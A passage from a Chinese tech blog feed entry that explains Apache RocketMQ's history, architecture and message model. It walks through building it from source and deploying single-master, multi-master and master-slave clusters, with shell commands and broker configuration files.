      <category term="ElasticSearch" scheme="http://chenzhonzhou.github.io/categories/ElasticSearch/"/>
    
    
      <category term="ElasticSearch" scheme="http://chenzhonzhou.github.io/tags/ElasticSearch/"/>
    
  </entry>
  
  <entry>
    <title>RocketMQ 集群原理及部署方式</title>
    <link href="http://chenzhonzhou.github.io/2021/01/11/rocketmq-ji-qun-yuan-li-ji-bu-shu-fang-shi/"/>
    <id>http://chenzhonzhou.github.io/2021/01/11/rocketmq-ji-qun-yuan-li-ji-bu-shu-fang-shi/</id>
    <published>2021-01-11T08:21:47.000Z</published>
    <updated>2021-01-12T10:43:58.333Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Mon Sep 27 2021 17:04:49 GMT+0800 (GMT+08:00) --><h2 id="一、RocketMQ简介"><a href="#一、RocketMQ简介" class="headerlink" title="一、RocketMQ简介"></a>一、RocketMQ简介</h2><p><strong>RocketMQ</strong>是一个纯<strong>Java</strong>、分布式、队列模型的开源消息中间件，前身是<strong>MetaQ</strong>，是阿里参考<strong>Kafka</strong>特点研发的一个队列模型的消息中间件，后开源给<strong>apache</strong>基金会成为了<strong>apache</strong>的顶级开源项目，具有高性能、高可靠、高实时、分布式特点。</p><p>RocketMQ单机也可以支持<strong>亿级的消息堆积能力</strong>。单机写入<strong>TPS单实例约7万条/秒</strong>，单机部署3个Broker，可以跑到最高<strong>12万条/秒</strong>，消息大小<strong>10个字节</strong>。</p><h3 id="1-1-RocketMQ发展历程"><a href="#1-1-RocketMQ发展历程" class="headerlink" title="1.1 RocketMQ发展历程"></a>1.1 RocketMQ发展历程</h3><p><strong>2007年</strong>：淘宝实施了“五彩石”项目，“五彩石”用于将交易系统从单机变成分布式，也是在这个过程中产生了阿里巴巴第一代消息引擎——Notify。<br><strong>2010年</strong>：阿里巴巴B2B部门基于ActiveMQ的5.1版本也开发了自己的一款消息引擎，称为Napoli，这款消息引擎在B2B里面广泛地被使用，不仅仅是在交易领域，在很多的后台异步解耦等方面也得到了广泛的应用。<br><strong>2011年</strong>：业界出现了现在被很多大数据领域所推崇的Kafka消息引擎，阿里巴巴在研究了Kafka的整体机制和架构设计之后，基于Kafka的设计使用Java进行了完全重写并推出了<strong>MetaQ 1.0</strong>版本，主要是用于解决顺序消息和海量堆积的问题。<br><strong>2012年</strong>：阿里巴巴开源其自研的第三代分布式消息中间件——<strong>RocketMQ</strong>。<br>经过几年的技术打磨，阿里称基于RocketMQ技术，目前双十一当天消息容量可达到万亿级。<br><strong>2016年11月</strong>：阿里将RocketMQ捐献给<strong>Apache</strong>软件基金会，正式成为孵化项目。<br>阿里称会将其打造成顶级项目。<strong>这是阿里迈出的一大步</strong>，因为加入到开源软件基金会需要经过评审方的考核与观察。<br><strong>2017年2月20日</strong>：RocketMQ正式发布4.0版本，专家称新版本适用于电商领域，金融领域，大数据领域，兼有物联网领域的编程模型。</p><p>以上就是RocketMQ的整体发展历史，其实在阿里巴巴内部围绕着RocketMQ内核打造了三款产品，分别是<strong>MetaQ</strong>、<strong>Notify</strong>和<strong>Aliware MQ</strong>。</p><p>这三者分别采用了不同的模型，<strong>MetaQ</strong>主要使用了拉模型，解决了顺序消息和海量堆积问题；<strong>Notify</strong>主要使用了推模型，解决了事务消息；而云产品<strong>Aliware MQ</strong>则是提供了商业化的版本。</p><h3 id="1-2-RocketMQ的功能"><a href="#1-2-RocketMQ的功能" class="headerlink" title="1.2 RocketMQ的功能"></a>1.2 RocketMQ的功能</h3><p><strong><a href="https://github.com/apache/rocketmq" target="_blank" rel="noopener">github</a></strong></p><ul><li><p>消息传递模式包括发布/订阅、请求/回复和流式传输</p></li><li><p>财务级事务消息</p></li><li><p>基于<a href="https://github.com/openmessaging/openmessaging-storage-dledger" target="_blank" rel="noopener">DLedger</a>的内置容错和高可用性配置选项</p></li><li><p>各种跨语言客户端，如java、C/C++、Python、Go</p></li><li><p>可插拔传输协议，如TCP、SSL、AIO</p></li><li><p>内置消息跟踪功能，还支持opentracing</p></li><li><p>多功能大数据与流媒体生态系统集成</p></li><li><p>按时间或偏移量的邮件追溯</p></li><li><p>同一队列中可靠的FIFO和严格有序的消息传递</p></li><li><p>高效的推拉消费模式</p></li><li><p>单队列百万级消息累积容量</p></li><li><p>多种消息传递协议，如JMS和OpenMessageing</p></li><li><p>灵活的分布式部署体系结构</p></li><li><p>闪电式批量信息交换系统</p></li><li><p>各种消息过滤机制，如SQL和Tag</p></li><li><p>用于独立测试和云隔离集群的Docker映像</p></li><li><p>功能丰富的管理仪表板，用于配置、度量和监视</p></li><li><p>身份验证和授权</p></li><li><p>免费开放源代码连接器，用于源和接收器</p></li></ul><h2 id="二、RocketMQ架构组成"><a href="#二、RocketMQ架构组成" class="headerlink" title="二、RocketMQ架构组成"></a>二、RocketMQ架构组成</h2><h3 id="2-1-集群组成"><a href="#2-1-集群组成" class="headerlink" title="2.1 集群组成"></a>2.1 集群组成</h3><p>RocketMQ部署结构如下图所示：</p><p><img src="/2021/01/11/rocketmq-ji-qun-yuan-li-ji-bu-shu-fang-shi/%E5%9B%BE%E7%89%871.png" alt="图片1"></p><p>从中间件服务角度来看整个RocketMQ消息系统（服务端）主要分为：<strong>NameServer和Broker</strong>两个部分。</p><h4 id="2-1-1-NameServer"><a href="#2-1-1-NameServer" class="headerlink" title="2.1.1 NameServer"></a>2.1.1 NameServer</h4><blockquote><p>提供服务发现和注册，这里主要是管理Broker，NameServer接受来自Broker的注册，并通过心跳机制来检测Broker服务的健康性；</p><p>提供路由功能，集群(这里是指以集群方式部署的NameServer)中的每个NameServer都保存了Broker集群(这里是指以集群方式部署的Broker)中整个的路由信息和队列信息。这里需要注意，在NameServer集群中，每个NameServer都是相互独立的，所以每个Broker需要连接所有的NameServer，每创建一个新的topic都要同步到所有的NameServer上。</p></blockquote><p><strong>NameServer</strong>是一个功能齐全的服务器，其角色类似Dubbo中的Zookeeper，但NameServer与Zookeeper相比更轻量。主要是因为每个NameServer节点互相之间是独立的，没有任何信息交互。</p><p><strong>NameServer</strong>压力不会太大，平时主要开销是在维持心跳和提供Topic-Broker的关系数据。<br>但有一点需要注意，Broker向NameServer发心跳时， 会带上当前自己所负责的所有<strong>Topic</strong>信息，如果<strong>Topic</strong>个数太多（万级别），会导致一次心跳中，就Topic的数据就几十M，网络情况差的话， 网络传输失败，心跳失败，导致NameServer误认为Broker心跳失败。</p><p><strong>NameServer</strong> 被设计成几乎无状态的，可以横向扩展，节点之间相互之间无通信，通过部署多台机器来标记自己是一个伪集群。</p><p>每个 Broker 在启动的时候会到 NameServer 注册，Producer 在发送消息前会根据 Topic 到 <strong>NameServer</strong> 获取到 Broker 的路由信息，Consumer 也会定时获取 Topic 的路由信息。</p><h4 id="2-1-2-Broker"><a href="#2-1-2-Broker" class="headerlink" title="2.1.2 Broker"></a>2.1.2 Broker</h4><blockquote><p>负责消息的存储、传递、查询以及高可用(HA)保证等。其由如下几个子模块（源码总体上也是这么拆分的）构成：</p><p>Remoting Module：整个Broker的实体，负责处理来自clients端的请求。<br>Client Manager：负责管理客户端(Producer/Consumer)和维护Consumer的Topic订阅信息<br>Store Service：提供方便简单的API接口处理消息存储到物理硬盘和查询功能。<br>HA Service：高可用服务，提供Master Broker 和 Slave Broker之间的数据同步功能。<br>Index Service：根据特定的Message key对投递到Broker的消息进行索引服务，以提供消息的快速查询。</p></blockquote><p><strong>Broker</strong>是具体提供业务的服务器，单个Broker节点与所有的NameServer节点保持长连接及心跳，并会定时将<strong>Topic</strong>信息注册到NameServer，顺带一提底层的通信和连接都是<strong>基于Netty实现</strong>的。</p><p><strong>Broker</strong>负责消息存储，以Topic为纬度支持轻量级的队列，单机可以支撑上万队列规模，支持消息推拉模型。</p><p>官网上有数据显示：具有<strong>上亿级消息堆积能力</strong>，同时可<strong>严格保证消息的有序性</strong>。</p><p>而从客户端的角度看主要有：<strong>Producer、Consumer</strong>两个部分。</p><h4 id="2-1-3-Producer"><a href="#2-1-3-Producer" class="headerlink" title="2.1.3 Producer"></a>2.1.3 Producer</h4><blockquote><p>消息生产者，负责产生消息，一般由业务系统负责产生消息。</p></blockquote><p><strong>Producer</strong>由用户进行分布式部署，消息由<strong>Producer</strong>通过多种负载均衡模式发送到<strong>Broker</strong>集群，发送低延时，支持快速失败。</p><p><strong>RocketMQ</strong> 提供了三种方式发送消息：同步、异步和单向</p><ul><li><strong>同步发送</strong>：同步发送指消息发送方发出数据后会在收到接收方发回响应之后才发下一个数据包。一般用于重要通知消息，例如重要通知邮件、营销短信。</li><li><strong>异步发送</strong>：异步发送指发送方发出数据后，不等接收方发回响应，接着发送下个数据包，一般用于可能链路耗时较长而对响应时间敏感的业务场景，例如用户视频上传后通知启动转码服务。</li><li><strong>单向发送</strong>：单向发送是指只负责发送消息而不等待服务器回应且没有回调函数触发，适用于某些耗时非常短但对可靠性要求并不高的场景，例如日志收集。</li></ul><h4 id="2-1-4-Consumer"><a href="#2-1-4-Consumer" class="headerlink" title="2.1.4 Consumer"></a>2.1.4 Consumer</h4><blockquote><p>消息消费者，负责消费消息，一般是后台系统负责异步消费。</p></blockquote><p><strong>Consumer</strong>也由用户部署，支持以push推，pull拉两种模式对消息进行消费。同时也支持集群方式和广播方式的消费，它提供实时消息订阅机制，可以满足大多数用户的需求。</p><p><strong>Pull</strong>：拉取型消费者（Pull Consumer）主动从消息服务器拉取信息，只要批量拉取到消息，用户应用就会启动消费过程，所以 Pull 称为主动消费型。</p><p><strong>Push</strong>：推送型消费者（Push Consumer）封装了消息的拉取、消费进度和其他的内部维护工作，将消息到达时执行的回调接口留给用户应用程序来实现。所以 Push 称为被动消费类型，但从实现上看还是从消息服务器中拉取消息，不同于 Pull 的是 Push 首先要注册消费监听器，当监听器处触发后才开始消费消息。</p><h3 id="2-2-消息领域模型"><a href="#2-2-消息领域模型" class="headerlink" title="2.2 消息领域模型"></a>2.2 消息领域模型</h3><p><img src="/2021/01/11/rocketmq-ji-qun-yuan-li-ji-bu-shu-fang-shi/%E5%9B%BE%E7%89%872.png" alt="图片2"></p><h4 id="2-2-1-Message"><a href="#2-2-1-Message" class="headerlink" title="2.2.1 Message"></a>2.2.1 Message</h4><p><strong>Message</strong>（消息）就是要传输的信息。</p><p>一条消息必须有一个主题（Topic），主题可以看做是你的信件要邮寄的地址。<br>一条消息也可以拥有一个可选的标签（Tag）和额处的键值对，它们可以用于设置一个业务 Key 并在 Broker 上查找此消息以便在开发期间查找问题。</p><h4 id="2-2-2-Topic"><a href="#2-2-2-Topic" class="headerlink" title="2.2.2 Topic"></a>2.2.2 Topic</h4><p><strong>Topic</strong>（主题）可以看做消息的规类，它是消息的第一级类型。比如一个电商系统可以分为：交易消息、物流消息等，一条消息必须有一个 Topic 。</p><p><strong>Topic</strong> 与生产者和消费者的关系非常松散，一个 Topic 可以有0个、1个、多个生产者向其发送消息，一个生产者也可以同时向不同的 Topic 发送消息。一个 Topic 也可以被 0个、1个、多个消费者订阅。</p><h4 id="2-2-3-Tag"><a href="#2-2-3-Tag" class="headerlink" title="2.2.3 Tag"></a>2.2.3 Tag</h4><p><strong>Tag</strong>（标签）可以看作子主题，它是消息的第二级类型，用于为用户提供额外的灵活性。使用标签，同一业务模块不同目的的消息就可以用相同 Topic 而不同的 <strong>Tag</strong> 来标识。比如交易消息又可以分为：交易创建消息、交易完成消息等，一条消息可以没有 <strong>Tag</strong> 。</p><p>标签有助于保持您的代码干净和连贯，并且还可以为 <strong>RocketMQ</strong> 提供的查询系统提供帮助。</p><h4 id="2-2-4-Group"><a href="#2-2-4-Group" class="headerlink" title="2.2.4 Group"></a>2.2.4 Group</h4><p>分组，一个组可以订阅多个Topic。<br>分为ProducerGroup，ConsumerGroup，代表某一类的生产者和消费者，一般来说同一个服务可以作为Group，同一个Group一般来说发送和消费的消息都是一样的</p><h4 id="2-2-5-Queue"><a href="#2-2-5-Queue" class="headerlink" title="2.2.5 Queue"></a>2.2.5 Queue</h4><p>在<strong>Kafka</strong>中叫Partition，每个Queue内部是有序的，在<strong>RocketMQ</strong>中分为读和写两种队列，一般来说读写队列数量一致，如果不一致就会出现很多问题。</p><h4 id="Message-Queue"><a href="#Message-Queue" class="headerlink" title="Message Queue"></a>Message Queue</h4><p><strong>Message Queue</strong>（消息队列），主题被划分为一个或多个子主题，即消息队列。</p><p>一个 Topic 下可以设置多个消息队列，发送消息时执行该消息的 Topic ，RocketMQ 会轮询该 Topic 下的所有队列将消息发出去。<br>一个Topic下可以有多个Queue，Queue的引入使得消息的存储可以分布式集群化，具有了水平扩展能力。</p><h4 id="2-2-6-Offset"><a href="#2-2-6-Offset" class="headerlink" title="2.2.6 Offset"></a>2.2.6 Offset</h4><p>在<strong>RocketMQ</strong> 中，所有消息队列都是持久化，长度无限的数据结构，所谓长度无限是指队列中的每个存储单元都是定长，访问其中的存储单元使用Offset 来访问，Offset 为 java long 类型，64 位，理论上在 100年内不会溢出，所以认为是长度无限。</p><p>也可以认为 Message Queue 是一个长度无限的数组，<strong>Offset</strong> 就是下标。</p><h3 id="2-3-消息消费模式"><a href="#2-3-消息消费模式" class="headerlink" title="2.3 消息消费模式"></a>2.3 消息消费模式</h3><p>消息消费模式有两种：<strong>Clustering</strong>（集群消费）和<strong>Broadcasting</strong>（广播消费）。</p><p>默认情况下就是集群消费，该模式下一个消费者集群共同消费一个主题的多个队列，一个队列只会被一个消费者消费，如果某个消费者挂掉，分组内其它消费者会接替挂掉的消费者继续消费。</p><p>而广播消费消息会发给消费者组中的每一个消费者进行消费。</p><h3 id="2-4-Message-Order"><a href="#2-4-Message-Order" class="headerlink" title="2.4 Message Order"></a>2.4 Message Order</h3><p><strong>Message Order</strong>（消息顺序）有两种：<strong>Orderly</strong>（顺序消费）和<strong>Concurrently</strong>（并行消费）。</p><p>顺序消费表示消息消费的顺序同生产者为每个消息队列发送的顺序一致，所以如果正在处理全局顺序是强制性的场景，需要确保使用的主题只有一个消息队列。</p><p>并行消费不再保证消息顺序，消费的最大并行数量受每个消费者客户端指定的线程池限制。</p><h2 id="三、RocketMQ集群模式"><a href="#三、RocketMQ集群模式" class="headerlink" title="三、RocketMQ集群模式"></a>三、RocketMQ集群模式</h2><p><strong>编译源码包</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[admin@rocketmq1 ~]$ wget https://github.com/apache/rocketmq/archive/rocketmq-all-4.8.0.tar.gz</span><br><span class="line">[admin@rocketmq1 ~]$ <span class="built_in">cd</span> rocketmq-rocketmq-all-4.8.0/</span><br><span class="line">[admin@rocketmq1 rocketmq-rocketmq-all-4.8.0]$ mvn -Prelease-all -DskipTests clean install -U</span><br></pre></td></tr></table></figure><p><strong>编译后产物所在目录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[admin@rocketmq1 rocketmq-rocketmq-all-4.8.0]$ ls distribution/target/rocketmq-4.8.0/rocketmq-4.8.0/</span><br><span class="line">benchmark  bin  conf  lib  LICENSE  NOTICE  README.md</span><br></pre></td></tr></table></figure><p><strong>拷贝到工作目录下</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[admin@rocketmq2 rocketmq-4.8.0]$ cp -rf distribution/target/rocketmq-4.8.0/rocketmq-4.8.0/ ~/rocketmq</span><br></pre></td></tr></table></figure><p><strong>安装jdk 1.8</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[admin@rocketmq1 ~]$ wget --no-cookies --no-check-certificate --header <span class="string">"Cookie: gpw_e24=http%3A%2F%2Fwww.oracle.com%2F; oraclelicense=accept-securebackup-cookie"</span> <span class="string">"http://download.oracle.com/otn-pub/java/jdk/8u141-b15/336fa29ff2bb4ef291e347e091f7f4a7/jdk-8u141-linux-x64.tar.gz"</span></span><br><span class="line"> </span><br><span class="line">[admin@rocketmq1 ~]$ tar xzf jdk-8u141-linux-x64.tar.gz</span><br><span class="line">[admin@rocketmq1 ~]$ sudo vim /etc/profile</span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/work/admin/jdk-8u141-linux</span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line">[admin@rocketmq1 ~]$ <span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure><h3 id="3-1-单Master模式"><a href="#3-1-单Master模式" class="headerlink" title="3.1 单Master模式"></a>3.1 单Master模式</h3><p>这种方式风险较大，一旦Broker重启或者宕机时，会导致整个服务不可用。不建议线上环境使用,可以用于本地测试。</p><p><strong>环境如下：</strong></p><table><thead><tr><th>主机</th><th>IP地址</th><th>组件划分</th></tr></thead><tbody><tr><td>rocketmq1</td><td>192.168.10.76</td><td>Nameserver、Broker</td></tr></tbody></table><h4 id="3-1-1-启动nameserver"><a href="#3-1-1-启动nameserver" class="headerlink" title="3.1.1 启动nameserver"></a>3.1.1 启动nameserver</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[admin@rocketmq1 ~]$ <span class="built_in">cd</span> rocketmq-4.8.0/</span><br><span class="line">[admin@rocketmq1 rocketmq-4.8.0]$ nohup bash bin/mqnamesrv &amp;</span><br></pre></td></tr></table></figure><h4 id="3-1-2-启动broker"><a href="#3-1-2-启动broker" class="headerlink" title="3.1.2 启动broker"></a>3.1.2 启动broker</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[admin@rocketmq1 rocketmq-4.8.0]$ nohup bash bin/mqbroker -n 127.0.0.1:9876 autoCreateTopicEnable=<span class="literal">true</span> -c conf/broker.conf &amp;</span><br></pre></td></tr></table></figure><p>内存不够的话可以修改<code>bin/runserver.sh</code>和<code>bin/runbroker.sh</code>适当降低内存限制。</p><h4 id="3-1-3-看是否启动成功"><a href="#3-1-3-看是否启动成功" class="headerlink" title="3.1.3 看是否启动成功"></a>3.1.3 看是否启动成功</h4><p>通过jps命令查看是否启动成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[admin@rocketmq1 rocketmq-4.8.0]$ jps</span><br><span class="line">2272 Jps</span><br><span class="line">2213 NamesrvStartup</span><br><span class="line">2254 BrokerStartup</span><br></pre></td></tr></table></figure><h3 id="3-2-多Master模式"><a href="#3-2-多Master模式" class="headerlink" title="3.2 多Master模式"></a>3.2 多Master模式</h3><p>一个集群无Slave，全是Master，例如2个Master或者3个Master，这种模式的优缺点如下：</p><ul><li><p>优点：配置简单，单个Master宕机或重启维护对应用无影响，在磁盘配置为RAID10时，即使机器宕机不可恢复情况下，由于RAID10磁盘非常可靠，消息也不会丢（异步刷盘丢失少量消息，同步刷盘一条不丢），性能最高；</p></li><li><p>缺点：单台机器宕机期间，这台机器上未被消费的消息在机器恢复之前不可订阅，消息实时性会受到影响。</p></li></ul><p><strong>环境如下：</strong></p><table><thead><tr><th>主机</th><th>IP地址</th><th>组件划分</th></tr></thead><tbody><tr><td>rocketmq1</td><td>192.168.10.76</td><td>Nameserver1、Broker_Master-1</td></tr><tr><td>rocketmq2</td><td>192.168.10.77</td><td>Nameserver2、Broker_Master-2</td></tr></tbody></table><h4 id="3-2-1-创建目录修改配置"><a href="#3-2-1-创建目录修改配置" class="headerlink" title="3.2.1 创建目录修改配置"></a>3.2.1 创建目录修改配置</h4><p><strong>创建数据目录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在各服务器执行以下命令创建数据目录</span></span><br><span class="line"></span><br><span class="line">[admin@rocketmq1 rocketmq]$ mkdir -p /home/admin/rocketmq/data/store</span><br><span class="line">[admin@rocketmq1 rocketmq]$ mkdir -p /home/admin/rocketmq/data/store/commitlog</span><br><span class="line">[admin@rocketmq1 rocketmq]$ mkdir -p /home/admin/rocketmq/data/store/consumequeue</span><br><span class="line">[admin@rocketmq1 rocketmq]$ mkdir -p /home/admin/rocketmq/data/store/index</span><br></pre></td></tr></table></figure><p><strong>修改日志路径</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在各服务器执行以下命令修改日志存储路径</span></span><br><span class="line"></span><br><span class="line">[admin@rocketmq1 rocketmq]$ sed -i  <span class="string">'s#$&#123;user.home&#125;#/home/admin/rocketmq/data#g'</span> conf/*.xml</span><br></pre></td></tr></table></figure><p><strong>配置rocketmq</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置Broker_Master-1</span></span><br><span class="line"></span><br><span class="line">[admin@rocketmq1 rocketmq]$ cat conf/2m-noslave/broker-a.properties</span><br><span class="line">brokerClusterName=rocketmq-2m-noslave-cluster</span><br><span class="line">brokerName=rocketmq-broker-m1</span><br><span class="line">brokerId=0</span><br><span class="line">namesrvAddr=192.168.10.76:9876;192.168.10.77:9876</span><br><span class="line">defaultTopicQueueNums=4</span><br><span class="line">autoCreateTopicEnable=<span class="literal">true</span></span><br><span class="line">autoCreateSubscriptionGroup=<span class="literal">true</span></span><br><span class="line">listenPort=10911</span><br><span class="line">deleteWhen=04</span><br><span class="line">fileReservedTime=120</span><br><span class="line">mapedFileSizeCommitLog=1073741824</span><br><span class="line">mapedFileSizeConsumeQueue=50000000</span><br><span class="line">destroyMapedFileIntervalForcibly=120000</span><br><span class="line">redeleteHangedFileInterval=120000</span><br><span class="line">diskMaxUsedSpaceRatio=88</span><br><span class="line">maxMessageSize=65536</span><br><span class="line">sendMessageThreadPoolNums=128</span><br><span class="line">pullMessageThreadPoolNums=128</span><br><span class="line">storePathRootDir=/home/admin/rocketmq/data/store</span><br><span class="line">storePathCommitLog=/home/admin/rocketmq/data/store/commitlog</span><br><span class="line">storePathConsumeQueue=/home/admin/rocketmq/data/store/consumequeue</span><br><span class="line">storePathIndex=/home/admin/rocketmq/data/store/index</span><br><span class="line">storeCheckpoint=/home/admin/rocketmq/data/store/checkpoint</span><br><span class="line">abortFile=/home/admin/rocketmq/data/store/abort</span><br><span class="line">brokerRole=ASYNC_MASTER</span><br><span class="line">flushDiskType=ASYNC_FLUSH</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置Broker_Master-2</span></span><br><span class="line"></span><br><span class="line">[admin@rocketmq2 rocketmq]$ cat conf/2m-noslave/broker-b.properties</span><br><span class="line">brokerClusterName=rocketmq-2m-noslave-cluster</span><br><span class="line">brokerName=rocketmq-broker-m2</span><br><span class="line">brokerId=0</span><br><span class="line">namesrvAddr=192.168.10.76:9876;192.168.10.77:9876</span><br><span class="line">defaultTopicQueueNums=4</span><br><span class="line">autoCreateTopicEnable=<span class="literal">true</span></span><br><span class="line">autoCreateSubscriptionGroup=<span class="literal">true</span></span><br><span class="line">listenPort=10911</span><br><span class="line">deleteWhen=04</span><br><span class="line">fileReservedTime=120</span><br><span class="line">mapedFileSizeCommitLog=1073741824</span><br><span class="line">mapedFileSizeConsumeQueue=50000000</span><br><span class="line">destroyMapedFileIntervalForcibly=120000</span><br><span class="line">redeleteHangedFileInterval=120000</span><br><span class="line">diskMaxUsedSpaceRatio=88</span><br><span class="line">maxMessageSize=65536</span><br><span class="line">sendMessageThreadPoolNums=128</span><br><span class="line">pullMessageThreadPoolNums=128</span><br><span class="line">storePathRootDir=/home/admin/rocketmq/data/store</span><br><span class="line">storePathCommitLog=/home/admin/rocketmq/data/store/commitlog</span><br><span class="line">storePathConsumeQueue=/home/admin/rocketmq/data/store/consumequeue</span><br><span class="line">storePathIndex=/home/admin/rocketmq/data/store/index</span><br><span class="line">storeCheckpoint=/home/admin/rocketmq/data/store/checkpoint</span><br><span class="line">abortFile=/home/admin/rocketmq/data/store/abort</span><br><span class="line">brokerRole=ASYNC_MASTER</span><br><span class="line">flushDiskType=ASYNC_FLUSH</span><br></pre></td></tr></table></figure><h4 id="3-2-2-启动NameServer"><a href="#3-2-2-启动NameServer" class="headerlink" title="3.2.2 启动NameServer"></a>3.2.2 启动NameServer</h4><p>NameServer需要先于Broker启动，且如果在生产环境使用，为了保证高可用，建议一般规模的集群启动3个NameServer，各节点的启动命令相同，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#启动Nameserver1</span></span><br><span class="line">[admin@rocketmq1 rocketmq]$ nohup bash bin/mqnamesrv &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动Nameserver2</span></span><br><span class="line">[admin@rocketmq2 rocketmq]$ nohup bash bin/mqnamesrv &amp;</span><br></pre></td></tr></table></figure><h4 id="3-2-3-启动Broker"><a href="#3-2-3-启动Broker" class="headerlink" title="3.2.3 启动Broker"></a>3.2.3 启动Broker</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#启动Broker_Master-1</span></span><br><span class="line">[admin@rocketmq1 rocketmq]$ nohup bash bin/mqbroker -c conf/2m-noslave/broker-a.properties &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动Broker_Master-2</span></span><br><span class="line">[admin@rocketmq2 rocketmq]$ nohup bash bin/mqbroker -c conf/2m-noslave/broker-b.properties &amp;</span><br></pre></td></tr></table></figure><h4 id="3-2-4-关闭服务"><a href="#3-2-4-关闭服务" class="headerlink" title="3.2.4 关闭服务"></a>3.2.4 关闭服务</h4><p><strong>关闭NameServer</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[admin@rocketmq1 rocketmq]$ bash bin/mqshutdown namesrv</span><br></pre></td></tr></table></figure><p><strong>关闭Broker</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> [admin@rocketmq1 rocketmq]$ bash bin/mqshutdown broker</span><br></pre></td></tr></table></figure><h3 id="3-3-多Master多Slave模式-异步复制"><a href="#3-3-多Master多Slave模式-异步复制" class="headerlink" title="3.3 多Master多Slave模式-异步复制"></a>3.3 多Master多Slave模式-异步复制</h3><p>每个Master配置一个Slave，有多对Master-Slave，HA采用异步复制方式，主备有短暂消息延迟（毫秒级），这种模式的优缺点如下：</p><ul><li>优点：即使磁盘损坏，消息丢失的非常少，且消息实时性不会受影响，同时Master宕机后，消费者仍然可以从Slave消费，而且此过程对应用透明，不需要人工干预，性能同多Master模式几乎一样；</li><li>缺点：Master宕机，磁盘损坏情况下会丢失少量消息。</li></ul><p><strong>环境如下：</strong></p><table><thead><tr><th>主机</th><th>IP地址</th><th>组件划分</th></tr></thead><tbody><tr><td>rocketmq1</td><td>192.168.10.76</td><td>Nameserver1、Broker_Master-1</td></tr><tr><td>rocketmq2</td><td>192.168.10.77</td><td>Nameserver2、Broker_Master-2</td></tr><tr><td>rocketmq3</td><td>192.168.10.78</td><td>Nameserver3、Broker_Master_slave-1</td></tr><tr><td>rocketmq4</td><td>192.168.10.79</td><td>Nameserver4、Broker_Master_slave-2</td></tr></tbody></table><h4 id="3-3-1-创建目录修改配置"><a 